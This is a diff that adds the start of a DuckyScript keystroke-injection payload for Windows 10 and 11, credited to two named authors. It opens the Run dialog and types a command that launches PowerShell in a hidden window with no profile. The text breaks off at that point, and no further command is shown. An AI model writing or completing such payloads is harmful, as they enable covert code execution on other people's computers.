@@ -1,0 +1,4 @@
+REM This Payload is made by bst04 and jk759.
+REM This version supports Windows 10 and 11
+GUI r
+STRINGLN powershell -w h -NoP 
